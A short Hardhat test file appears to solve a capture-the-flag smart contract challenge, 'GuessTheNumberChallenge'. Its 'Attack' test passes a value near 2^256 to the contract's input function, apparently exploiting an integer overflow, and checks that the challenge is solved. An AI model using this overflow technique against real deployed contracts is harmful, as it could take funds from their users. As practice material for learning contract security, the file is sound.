import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { GuessTheNumberChallenge } from '../typechain-types'
import { BigNumber } from 'ethers'

describe('GuessTheNumberChallenge', async function () {
  let player: SignerWithAddress
  let challenge: GuessTheNumberChallenge

  before(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('GuessTheNumberChallenge')
    challenge = (await Challenge.deploy()) as GuessTheNumberChallenge
  })

  it('Attack', async function () {
    const a = 0
    const b = BigNumber.from(
      '115792089237316195423570985008687907853269984665640564039457584007913129638936'
    )
    await challenge.input(a, b)
    expect(await challenge.isSolved()).to.be.true
  })
})
